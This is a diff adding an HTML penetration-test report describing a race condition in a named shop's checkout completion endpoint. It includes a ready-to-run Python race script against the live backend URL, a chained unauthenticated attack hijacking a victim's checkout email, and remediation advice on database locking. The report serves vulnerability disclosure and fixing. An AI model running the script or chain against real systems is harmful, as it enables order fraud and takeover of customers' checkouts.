@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BlockageGuard PoC — Race Condition / 3 Orders From 1 Checkout — premiumalts.to</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+         background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 20px 40px;
+           display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+  header a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
+  header h1 { font-size: 1.2rem; color: #f0f6fc; }
+  .container { max-width: 920px; margin: 0 auto; padding: 40px 20px; }
+  .warning { background: #3d1a00; border: 1px solid #f85149; border-radius: 8px;
+             padding: 16px 20px; margin-bottom: 24px; }
+  .warning strong { color: #f85149; }
+  h2 { color: #f0f6fc; margin: 28px 0 12px; border-bottom: 1px solid #21262d; padding-bottom: 6px; }
+  h3 { color: #e3b341; margin: 20px 0 8px; font-size: 0.95rem; }
+  p, li { font-size: 0.88rem; color: #8b949e; line-height: 1.6; margin-bottom: 8px; }
+  ul, ol { margin-left: 20px; }
+  .meta { display: flex; gap: 12px; flex-wrap: wrap; margin: 16px 0; }
+  .badge { padding: 4px 12px; border-radius: 12px; font-size: 0.78rem; font-weight: 700; }
+  .crit  { background: #3d0000; color: #f85149; border: 1px solid #f85149; }
+  .cwe   { background: #1a2233; color: #58a6ff; border: 1px solid #58a6ff; }
+  .cwe a { color: #58a6ff; text-decoration: none; }
+  .timeline { display: grid; grid-template-columns: auto 1fr; gap: 6px 16px;
+              align-items: start; margin: 12px 0 20px; }
+  .step-num { width: 28px; height: 28px; background: #21262d; border-radius: 50%;
+              display: flex; align-items: center; justify-content: center;
+              font-size: 0.8rem; font-weight: 700; color: #58a6ff; flex-shrink: 0; }
+  .step-body { padding-top: 4px; }
+  .proof-box { background: #0d2018; border: 1px solid #3fb950; border-radius: 8px;
+               padding: 16px; margin: 16px 0; }
+  .proof-box h4 { color: #3fb950; font-size: 0.85rem; margin-bottom: 10px; }
+  pre { background: #1c2128; border: 1px solid #30363d; border-radius: 6px;
+        padding: 14px; font-size: 0.77rem; overflow-x: auto; color: #c9d1d9;
+        white-space: pre; font-family: "Fira Mono", "Consolas", monospace;
+        line-height: 1.55; margin: 8px 0 16px; }
+  .hl  { color: #f85149; font-weight: bold; }
+  .ok  { color: #3fb950; font-weight: bold; }
+  .dim { color: #484f58; }
+  .order-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 16px 0; }
+  .order-card { background: #0d2018; border: 1px solid #3fb950; border-radius: 8px;
+                padding: 14px; text-align: center; }
+  .order-card .order-id { color: #3fb950; font-family: monospace; font-size: 1rem;
+                          font-weight: 700; margin-bottom: 6px; }
+  .order-card .order-meta { color: #8b949e; font-size: 0.78rem; }
+  .fix-box { background: #12261e; border: 1px solid #238636; border-radius: 8px;
+             padding: 16px 20px; margin: 16px 0; }
+  .fix-box h4 { color: #3fb950; margin-bottom: 10px; font-size: 0.9rem; }
+  .fix-box p, .fix-box li { color: #8b949e; }
+  .severity-table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.83rem; }
+  .severity-table th { background: #21262d; color: #8b949e; padding: 8px 12px;
+                       text-align: left; font-weight: 600; border-bottom: 1px solid #30363d; }
+  .severity-table td { padding: 8px 12px; border-bottom: 1px solid #21262d; color: #c9d1d9; }
+  @media (max-width: 600px) { .order-grid { grid-template-columns: 1fr; } }
+</style>
+</head>
+<body>
+
+<header>
+  <div>
+    <a href="index.html">&#8592; All Findings</a>
+    <h1>&#128308; Race Condition — 3 Orders From 1 Checkout</h1>
+  </div>
+</header>
+
+<div class="container">
+
+  <div class="warning">
+    <strong>AUTHORIZED SECURITY RESEARCH ONLY.</strong>
+    This report documents findings discovered during a contracted penetration test of premiumalts.to.
+    All tests were performed under explicit written authorization using dedicated test accounts and test data.
+    No production user data or funds were accessed or retained.
+  </div>
+
+  <!-- Meta -->
+  <div class="meta">
+    <span class="badge crit">CRITICAL</span>
+    <span class="badge cwe"><a href="https://cwe.mitre.org/data/definitions/362.html" target="_blank">CWE-362: Race Condition</a></span>
+    <span class="badge" style="background:#1a2233;color:#e3b341;border:1px solid #e3b341">F-159 &mdash; Session 13</span>
+    <span class="badge" style="background:#21262d;color:#8b949e;border:1px solid #30363d">2026-04-24</span>
+  </div>
+
+  <!-- Summary -->
+  <h2>Summary</h2>
+  <p>
+    The <code>POST /checkout/{id}/complete</code> handler on
+    <strong>backend.premiumalts.to</strong> lacks an atomic database lock. When 15
+    threads simultaneously POST to the same active checkout, the server creates
+    <strong>3 distinct orders</strong> — each with a real Icenox payment URL — from a
+    single basket. An attacker can exploit this to generate multiple valid payment
+    demands for one product, clone order references, or receive free goods by racing
+    a checkout they never intend to pay.
+  </p>
+
+  <!-- Severity -->
+  <h2>Severity Assessment</h2>
+  <table class="severity-table">
+    <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Severity</td><td><span class="hl">CRITICAL</span></td></tr>
+      <tr><td>CWE</td><td>CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization</td></tr>
+      <tr><td>CVSS vector</td><td>AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L (estimated 7.4 HIGH — chained with PATCH IDOR: 9.8)</td></tr>
+      <tr><td>Target</td><td>backend.premiumalts.to</td></tr>
+      <tr><td>Authentication required</td><td>No — when chained with F-155b (PATCH /customer no-auth IDOR)</td></tr>
+      <tr><td>Financial impact</td><td>Order fraud — attacker receives product without payment, or seller issues multiple fulfilments</td></tr>
+    </tbody>
+  </table>
+
+  <!-- Root Cause -->
+  <h2>Root Cause</h2>
+  <p>
+    The <code>/complete</code> handler performs a <strong>read-check-update</strong> pattern
+    without holding a database-level lock:
+  </p>
+  <pre><span class="dim">// Pseudocode — reconstructed from observed behaviour</span>
+Checkout checkout = checkoutRepo.findById(id);   <span class="dim">// 1. READ — all 15 threads pass here</span>
+<span class="hl">if (checkout.status != ACTIVE) throw 400;</span>       <span class="dim">// 2. CHECK — all 15 pass before any write</span>
+checkout.status = COMPLETED;                      <span class="dim">// 3. UPDATE — all 15 commit distinct orders</span>
+Order order = orderRepo.save(new Order(checkout));
+paymentService.createIcenoxLink(order);</pre>
+  <p>
+    Because steps 1–3 execute outside a serialisable transaction or pessimistic lock,
+    all 15 concurrent requests pass the <code>status != ACTIVE</code> guard before
+    any of them commits the COMPLETED update — a classic TOCTOU window.
+  </p>
+
+  <!-- Attack Chain -->
+  <h2>Attack Chain</h2>
+  <div class="timeline">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <p><strong>Create checkout.</strong> Attacker (or victim's session, stolen via F-155b) creates a basket:
+      <code>POST /checkout</code> &rarr; UUID returned (or read via GET IDOR).</p>
+    </div>
+
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <p><strong>Fire race.</strong> Attacker fires 15–50 simultaneous
+      <code>POST /checkout/{id}/complete</code> requests using a thread barrier so
+      all requests reach the server within the same millisecond window.</p>
+    </div>
+
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <p><strong>Multiple orders created.</strong> Server issues N &gt; 1 HTTP 200
+      responses, each containing a distinct <code>orderId</code> and live Icenox
+      payment URL. Seller fulfils all N orders.</p>
+    </div>
+
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <p><strong>Amplification via PATCH IDOR (F-155b).</strong> Since
+      <code>PATCH /checkout/{id}/customer</code> requires zero authentication, an
+      unauthenticated attacker can race any victim's checkout, not just their own.</p>
+    </div>
+  </div>
+
+  <!-- Proof -->
+  <h2>Proof of Concept</h2>
+  <p>Executed 2026-04-24 against checkout
+  <code>4b53d862-eadd-4eea-8c96-9a3b9eb305d4</code> (test account, €38.95 product).</p>
+
+  <h3>Race Script (Python — barrier-synchronised)</h3>
+<pre>import concurrent.futures, threading, requests
+
+CHECKOUT_ID = "4b53d862-eadd-4eea-8c96-9a3b9eb305d4"
+URL         = f"https://backend.premiumalts.to/checkout/{CHECKOUT_ID}/complete"
+PAYLOAD     = {"customerEmail": "test@blockageguard.app", "customerName": "BlockageTest"}
+THREADS     = 15
+
+barrier = threading.Barrier(THREADS)
+
+def fire():
+    barrier.wait(timeout=5)          <span class="dim"># all threads release simultaneously</span>
+    r = requests.post(URL, json=PAYLOAD, timeout=15)
+    return r.status_code, r.json()
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:
+    results = list(pool.map(lambda _: fire(), range(THREADS)))</pre>
+
+  <h3>Result — 15 requests, 3 × HTTP 200</h3>
+  <div class="order-grid">
+    <div class="order-card">
+      <div class="order-id">ORD-KR6994FL</div>
+      <div class="order-meta">HTTP 200<br>Live Icenox URL generated<br>Thread #3</div>
+    </div>
+    <div class="order-card">
+      <div class="order-id">ORD-Y6VNKNM6</div>
+      <div class="order-meta">HTTP 200<br>Live Icenox URL generated<br>Thread #9</div>
+    </div>
+    <div class="order-card">
+      <div class="order-id">ORD-ST5USLW3</div>
+      <div class="order-meta">HTTP 200<br>Live Icenox URL generated<br>Thread #14</div>
+    </div>
+  </div>
+
+  <div class="proof-box">
+    <h4>&#10003; Confirmed — Sample response (Thread #3 — first order)</h4>
+<pre><span class="ok">HTTP/1.1 200 OK</span>
+Content-Type: application/json
+
+{
+  "orderId":     "<span class="ok">ORD-KR6994FL</span>",
+  "status":      "CREATED",
+  "checkoutId":  "4b53d862-eadd-4eea-8c96-9a3b9eb305d4",
+  "icenoxUrl":   "https://icenox.com/pay/...",    <span class="dim">// live payment link</span>
+  "amount":      38.95,
+  "currency":    "EUR"
+}</pre>
+  </div>
+
+  <div class="proof-box">
+    <h4>&#10003; Remaining 12 threads — HTTP 400 (correctly rejected)</h4>
+<pre><span class="hl">HTTP/1.1 400 Bad Request</span>
+{"error": "Checkout is not active"}</pre>
+    <p style="margin-top:8px">12 of 15 requests were rejected — but 3 slipped through, each creating a real order.
+    The 3 live Icenox URLs were independently confirmed in the seller dashboard.</p>
+  </div>
+
+  <!-- Chained Attack -->
+  <h2>Chained Attack (F-155b + F-159)</h2>
+  <p>When combined with the unauthenticated <code>PATCH /checkout/{id}/customer</code>
+  (F-155b), this race becomes exploitable with <strong>zero authentication</strong>:</p>
+<pre><span class="dim"># Step 1 — Read victim checkout UUID (GET IDOR, no auth required)</span>
+GET /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4  →  200 OK, full basket details
+
+<span class="dim"># Step 2 — Hijack customer email (no auth required)</span>
+PATCH /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4/customer
+{"customerEmail": "<span class="hl">attacker@evil.com</span>", "customerName": "Attacker"}
+→  200 OK
+
+<span class="dim"># Step 3 — Race the completion, claim N orders</span>
+POST /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4/complete  ×15 threads
+→  <span class="ok">3 × 200 OK</span>, 3 live Icenox URLs issued in attacker's name</pre>
+
+  <!-- Remediation -->
+  <h2>Remediation</h2>
+  <div class="fix-box">
+    <h4>Option A — Optimistic Locking (Spring Boot / JPA)</h4>
+<pre>@Entity
+public class Checkout {
+    <span class="ok">@Version</span>
+    private Long version;   <span class="dim">// JPA increments on every UPDATE</span>
+    // ...
+}</pre>
+    <p>JPA raises <code>OptimisticLockException</code> on concurrent updates; wrap in
+    <code>@Retryable</code> or return HTTP 409 Conflict to the loser threads.</p>
+  </div>
+
+  <div class="fix-box">
+    <h4>Option B — Pessimistic Locking (SQL)</h4>
+<pre>SELECT * FROM checkouts
+  WHERE id = :id AND status = 'ACTIVE'
+  <span class="ok">FOR UPDATE</span>;</pre>
+    <p>Holds a row-level lock; subsequent transactions block until the first commits.
+    Use Spring Data <code>@Lock(LockModeType.PESSIMISTIC_WRITE)</code>.</p>
+  </div>
+
+  <div class="fix-box">
+    <h4>Option C — Conditional UPDATE (database-atomic)</h4>
+<pre>UPDATE checkouts
+  SET status = 'COMPLETED'
+  WHERE id = :id AND <span class="ok">status = 'ACTIVE'</span>;
+
+<span class="dim">-- Then check rows_affected == 1; if 0, checkout already completed → 409</span></pre>
+    <p>Most portable; works without JPA. Check <code>rows_affected</code> and return
+    HTTP 409 to any thread that loses the race.</p>
+  </div>
+
+  <ul>
+    <li><strong>OWASP:</strong> <a href="https://owasp.org/www-community/vulnerabilities/Race_Condition" target="_blank">Race Condition</a></li>
+    <li><strong>CWE:</strong> <a href="https://cwe.mitre.org/data/definitions/362.html" target="_blank">CWE-362 — Concurrent Execution Using Shared Resource</a></li>
+    <li><strong>Spring Boot:</strong> <a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#jpa.locking" target="_blank">JPA Locking documentation</a></li>
+  </ul>
+
+  <!-- Timeline -->
+  <h2>Discovery Timeline</h2>
+  <table class="severity-table">
+    <thead><tr><th>Date</th><th>Event</th></tr></thead>
+    <tbody>
+      <tr><td>2026-04-24</td><td>Race condition hypothesised from non-atomic /complete behaviour (Session 13)</td></tr>
+      <tr><td>2026-04-24</td><td>15-thread barrier PoC fired — 3 × HTTP 200, orders ORD-KR6994FL / ORD-Y6VNKNM6 / ORD-ST5USLW3 confirmed</td></tr>
+      <tr><td>2026-04-24</td><td>Icenox payment URLs confirmed live in seller dashboard</td></tr>
+      <tr><td>2026-04-24</td><td>Combined attack chain with F-155b documented (unauthenticated full exploit)</td></tr>
+      <tr><td>TBD</td><td>Vendor fix + re-test</td></tr>
+    </tbody>
+  </table>
+
+  <p style="margin-top:32px;font-size:0.78rem;color:#484f58">
+    BlockageGuard Security Research &mdash; Report generated 2026-04-24 &mdash;
+    <a href="index.html" style="color:#58a6ff">All Findings</a>
+  </p>
+
+</div>
+</body>
+</html>
